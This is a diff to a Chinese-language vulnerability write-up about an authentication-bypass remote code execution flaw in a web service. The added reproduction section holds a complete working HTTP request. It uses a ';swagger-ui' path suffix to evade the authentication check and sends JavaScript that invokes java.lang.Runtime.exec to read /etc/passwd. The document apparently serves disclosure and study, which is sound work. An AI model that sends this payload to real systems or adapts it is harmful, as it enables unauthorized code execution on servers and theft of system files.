@@ -166,6 +166,24 @@
 
 接着返回执行结果。
 
-因为刚刚可以绕过鉴权，这里又可以执行请求体中的代码，所以构成了鉴权绕过远程代码执行的漏洞。
+因为刚刚可以绕过鉴权，这里又可以执行请求体中的javascript代码，所以构成了鉴权绕过远程代码执行的漏洞。
 
 # 二、漏洞复现
+构造payload
+只需包含`sampleItem`和`validationRules`即可：
+```
+POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+Host: 192.168.240.130:9095
+Authorization: 
+Accept-Language: zh-CN,zh;q=0.9
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Content-type: application/json
+Content-length:397
+
+{"sampleItem":"1","validationRules":"function verification(data) {var result = \"\";var process = java.lang.Runtime.getRuntime().exec([\"cat\", \"/etc/passwd\"]); var reader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream()) ); var line; while ((line = reader.readLine()) != null) { result += line + \"\\n\"; } reader.close();process.waitFor();return result; }"}
+```
+
+![alt text]({15951ECC-39E2-4DEA-ACA1-650C3D24C932}.png)
